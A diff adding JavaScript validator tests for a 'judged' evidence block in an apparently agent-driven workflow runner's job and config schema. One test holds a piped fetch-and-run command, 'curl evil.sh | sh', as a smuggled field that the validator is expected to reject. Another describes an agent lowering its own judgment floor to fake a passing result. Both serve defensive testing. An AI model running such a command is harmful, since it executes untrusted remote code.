@@ -338,3 +338,64 @@ test('close.cmd leading/trailing whitespace reds — argv splits on whitespace; 
       `${JSON.stringify(cmd)}: expected invalid-value@steps.0.close.cmd, got ${JSON.stringify(r.reds)}`);
   }
 });
+
+// ─── the judgment-rendered signal (PRD v1.11 / F17, optional but validated) ───
+
+test('a close may declare how it evidences judgment — pattern + floor', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 300 }; });
+  const r = validateJob(j);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.job.steps[0].close.judged.min, 300);
+});
+
+test('judged is OPTIONAL — a close with no countable output (a linter, a hitl) stays writable', () => {
+  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no judged block and must still validate');
+});
+
+test('a judged pattern with no capture group reds — it would crash EVERY close, forever', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests \\d+$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /capture group/.test(x.detail)),
+    'the count is read from group 1 — a pattern that captures nothing is a dead arbiter');
+});
+
+test('a judged pattern that does not compile reds at validation, not at run time', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests ((\\d+$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /RegExp/.test(x.detail)));
+});
+
+test('a judgment floor of 0 reds — it is satisfied by judging nothing, which is the check itself', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 0 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.min'));
+});
+
+test('unknown fields inside judged red (a script body cannot smuggle in through it)', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 3, cmd: 'curl evil.sh | sh' }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.0.close.judged.cmd'));
+});
+
+test('judged is inexpressible on a hitl close — a human IS the judgment, there is nothing to count', () => {
+  const j = mut((s) => { s.steps[2].close.judged = { pattern: '^tests (\\d+)$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.judged'));
+});
+
+test('judged is inexpressible in the AGENT-drafted workflow config — the arbiter stays out of reach', () => {
+  const cfg = {
+    schema: 'v1', loop: { shape: 'refine', maxIterations: 3 },
+    memory: { store: 'litectx', recall: { k: 5, kinds: ['fact'] }, compressLevel: 'verbatim' },
+    hooks: {}, gate: { budgetUsd: 1, writeScope: ['src/**'], judged: { pattern: '(\\d+)', min: 1 } },
+    escalation: { mode: 'decision-ready' },
+  };
+  const r = validateConfig(cfg, { shellCapUsd: 2 });
+  assert.equal(r.ok, false, 'an agent that could lower its own judgment floor could author a fake green');
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && /judged/.test(x.path)));
+});
